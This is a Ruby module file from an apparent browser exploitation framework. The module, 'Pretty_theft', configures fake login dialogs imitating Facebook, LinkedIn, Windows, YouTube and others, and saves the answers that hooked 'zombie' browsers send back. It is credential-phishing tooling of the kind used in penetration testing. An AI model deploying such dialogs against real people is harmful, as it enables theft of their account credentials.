#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (Server) - https://serverproject.com
# See the file 'doc/COPYING' for copying permission
#
class Pretty_theft < Server::Core::Command
  def self.options
    @configuration = Server::Core::Configuration.instance
    proto = @configuration.server_proto
    server_host = @configuration.server_host
    server_port = @configuration.server_port
    base_host = "#{proto}://#{server_host}:#{server_port}"
    logo_uri = "#{base_host}/ui/media/images/server.png"
    [
      { 'name' => 'choice', 'type' => 'combobox', 'ui_label' => 'Dialog Type', 'store_type' => 'arraystore', 'store_fields' => ['choice'],
        'store_data' => [['Facebook'], ['LinkedIn'], ['Windows'], ['YouTube'], ['Yammer'], ['IOS'], ['Generic']], 'valueField' => 'choice', 'value' => 'Facebook', editable: false, 'displayField' => 'choice', 'mode' => 'local', 'autoWidth' => true },

      { 'name' => 'backing', 'type' => 'combobox', 'ui_label' => 'Backing', 'store_type' => 'arraystore', 'store_fields' => ['backing'], 'store_data' => [['Grey'], ['Clear']],
        'valueField' => 'backing', 'value' => 'Grey', editable: false, 'displayField' => 'backing', 'mode' => 'local', 'autoWidth' => true },

      { 'name' => 'imgsauce', 'description' => 'Custom Logo', 'ui_label' => 'Custom Logo (Generic only)', 'value' => logo_uri }
    ]
  end

  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    save({ 'answer' => @datastore['answer'] })
  end
end
